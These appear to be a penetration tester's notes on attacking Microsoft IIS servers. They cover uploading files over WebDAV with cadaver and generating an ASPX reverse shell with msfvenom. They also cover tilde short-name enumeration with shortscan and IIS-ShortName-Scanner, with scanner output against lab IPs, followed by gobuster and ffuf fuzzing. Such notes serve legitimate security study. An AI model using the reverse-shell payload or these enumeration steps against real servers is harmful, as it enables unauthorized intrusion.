# IIS

If HTTP methods such as PUT and MOVE are allowed, we can use cadaver to upload a file and rename it


```bash
cadaver $HOSTNAME
put $FILE
move $FILE
# We can use more HTTP methods but these are important for exploiting.

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.0 LPORT=80 -f aspx -o reverse.aspx
```


&#x20;[https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html?highlight=iis#iis---internet-information-services](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html?highlight=iis#iis---internet-information-services)

[https://github.com/reewardius/iis-pentest](https://github.com/reewardius/iis-pentest)

## Tilde Enumeration
IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names (aka the `8.3 format`) on some versions of Microsoft Internet Information Services (IIS) web servers.

When a file or folder is created on an IIS server, Windows generates a short file name in the `8.3 format`, consisting of eight characters for the file name, a period, and three characters for the extension. Intriguingly, these short file names can grant access to their corresponding files and folders, even if they were meant to be hidden or inaccessible.

The tilde (`~`) character, followed by a sequence number, signifies a short file name in a URL. Hence, if someone determines a file or folder's short file name, they can exploit the tilde character and the short file name in the URL to access sensitive data or hidden resources.

The enumeration process starts by sending requests with various characters following the tilde:
```sh
http://example.com/~a
http://example.com/~b
http://example.com/~c
...

# You find one like ~s -> first char is s -> keep trying
http://example.com/~se
http://example.com/~sf
http://example.com/~sg
...

# Continuing this procedure, the short name `secret~1` is eventually discovered when the server returns a `200 OK` status code for the request `http://example.com/~secret`
# Imagine there are two files:
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/anotherfile.docx
# They could be accessed like this
http://example.com/secret~1/somefi~1.txt
```
### Enumeration
- Identify IIS service.
- Use [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) (Oracle Java required).
#### IIS ShortName Scanner
```sh
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Do you want to use proxy [Y=Yes, Anything Else=No]? 
# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```
Upon executing the tool, it discovers 2 directories and 3 files. However, the target does not permit `GET` access to `http://10.129.204.231/TRANSF~1.ASP`, necessitating the brute-forcing of the remaining filename.
#### Generate Wordlist
```sh
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```
This command combines `egrep` and `sed` to filter and modify the contents of input files, then save the results to a new file.

|**Command Part**|**Description**|
|---|---|
|`egrep -r ^transf`|The `egrep` command is used to search for lines containing a specific pattern in the input files. The `-r` flag indicates a recursive search through directories. The `^transf` pattern matches any line that starts with "transf". The output of this command will be lines that begin with "transf" along with their source file names.|
|`\|`|The pipe symbol (`\|`) is used to pass the output of the first command (`egrep`) to the second command (`sed`). In this case, the lines starting with "transf" and their file names will be the input for the `sed` command.|
|`sed 's/^[^:]*://'`|The `sed` command is used to perform a find-and-replace operation on its input (in this case, the output of `egrep`). The `'s/^[^:]*://'` expression tells `sed` to find any sequence of characters at the beginning of a line (`^`) up to the first colon (`:`), and replace them with nothing (effectively removing the matched text). The result will be the lines starting with "transf" but without the file names and colons.|
|`> /tmp/list.txt`|The greater-than symbol (`>`) is used to redirect the output of the entire command (i.e., the modified lines) to a new file named `/tmp/list.txt`.|
#### Fuzzing
```sh
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
...
/transfer.aspx        (Status: 200) [Size: 941]
```

## Uploading web.config

[https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/](https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Short Name

Microsoft IIS tilde character “\~” – Short File/Folder Name Disclosure

[https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html?highlight=iis#microsoft-iis-tilde-character--vulnerabilityfeature--short-filefolder-name-disclosure](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html?highlight=iis#microsoft-iis-tilde-character--vulnerabilityfeature--short-filefolder-name-disclosure)

Best tool -> [https://github.com/bitquark/shortscan\\](https://github.com/bitquark/shortscan/)


```bash
#Running the tool, I can find a part of the filepath:
└─$ shortscan http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
...
Vulnerable: Yes!
════════════════════════════════════════════════════════════════════════════════
POO_CO~1.TXT         POO_CO?.TXT?
════════════════════════════════════════════════════════════════════════════════


poo_coXXX.txt

# The second word after the underscore can be fuzzed (we could even narrow the search by grepping only coXXX words):


└─$ ffuf -c -r -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ -w /usr/share/custom-wordlists/Fuzzing/directory-list-lowercase-2.3-medium.txt -e .txt -t 200 -mc all
```

